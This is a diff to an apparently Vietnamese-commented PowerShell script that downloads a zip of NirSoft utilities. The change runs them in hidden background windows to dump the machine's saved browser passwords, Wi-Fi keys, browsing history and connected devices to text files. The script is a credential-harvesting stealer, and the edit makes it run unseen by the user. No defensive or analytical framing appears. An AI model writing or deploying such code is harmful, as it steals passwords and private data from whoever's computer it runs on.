@@ -27,11 +27,17 @@ Invoke-WebRequest $zipUrl -OutFile "tools.zip"
 # Giải nén ngay lập tức (các file .exe sẽ tự động bung ra tại thư mục hiện tại)
 Expand-Archive -Path "tools.zip" -DestinationPath "." -Force
 
-# Execute tools to gather data
-.\WNetWatcher.exe /stext connected_devices.txt
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
-.\WebBrowserPassView.exe /stext passwords.txt
-.\WirelessKeyView.exe /stext wifi.txt
+# Execute tools to gather data (chạy tuần tự)
+# .\WNetWatcher.exe /stext connected_devices.txt
+# .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
+# .\WebBrowserPassView.exe /stext passwords.txt
+# .\WirelessKeyView.exe /stext wifi.txt
+
+# CHẠY ĐA LUỒNG: Kích hoạt 4 công cụ quét cùng một lúc (Background Jobs)
+Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
+Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
+Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
+Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden
 
 # Wait for the files to be fully written
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
